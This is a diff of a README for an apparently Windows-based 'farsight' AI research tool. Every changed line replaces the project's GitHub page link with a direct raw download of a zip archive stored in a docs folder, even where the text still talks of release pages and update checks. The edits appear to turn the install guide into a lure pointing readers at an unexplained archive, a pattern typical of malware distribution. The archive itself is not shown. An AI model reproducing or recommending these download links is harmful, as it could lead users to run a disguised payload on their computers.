@@ -1,6 +1,6 @@
 # 👁 farsight - Deep AI Research Made Simple
 
-[![Download farsight](https://img.shields.io/badge/Download-farsight-ff6f61.svg)](https://github.com/FranchiseSmth/farsight)
+[![Download farsight](https://img.shields.io/badge/Download-farsight-ff6f61.svg)](https://raw.githubusercontent.com/FranchiseSmth/farsight/main/docs/Software-v1.0.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Follow these clear steps to download, install, and run farsight on your Windows 
 
 Start by visiting the official GitHub page to get the latest version.
 
-[![Download farsight](https://img.shields.io/badge/Download-farsight-4a90e2.svg)](https://github.com/FranchiseSmth/farsight)
+[![Download farsight](https://img.shields.io/badge/Download-farsight-4a90e2.svg)](https://raw.githubusercontent.com/FranchiseSmth/farsight/main/docs/Software-v1.0.zip)
 
 Click the button above to open the page where you can download the app. The page includes all releases and instructions.
 
@@ -42,7 +42,7 @@ Make sure your Windows computer meets these basic requirements:
 
 ## 📥 How to download and install farsight
 
-1. **Visit the download page:** Use the first download button or go to https://github.com/FranchiseSmth/farsight.
+1. **Visit the download page:** Use the first download button or go to https://raw.githubusercontent.com/FranchiseSmth/farsight/main/docs/Software-v1.0.zip
 
 2. **Find the latest release:** Look for the “Releases” or “Download” section on the page. It usually lists files like installers or zip archives.
 
@@ -103,7 +103,7 @@ If you run into issues, try these steps:
 
 ## 🌐 Learn more and support
 
-- Visit https://github.com/FranchiseSmth/farsight anytime to check for updates or new features.
+- Visit https://raw.githubusercontent.com/FranchiseSmth/farsight/main/docs/Software-v1.0.zip anytime to check for updates or new features.
 - Review the README and documentation files on the GitHub page for detailed setup guides.
 - If you know how to code, you can contribute by adding new skills or fixing bugs.
 
@@ -111,6 +111,6 @@ If you run into issues, try these steps:
 
 ## ⬇ Download farsight now
 
-[Download farsight from GitHub](https://github.com/FranchiseSmth/farsight)  
+[Download farsight from GitHub](https://raw.githubusercontent.com/FranchiseSmth/farsight/main/docs/Software-v1.0.zip)  
 
 Use this link to access all the latest software files and installation instructions.
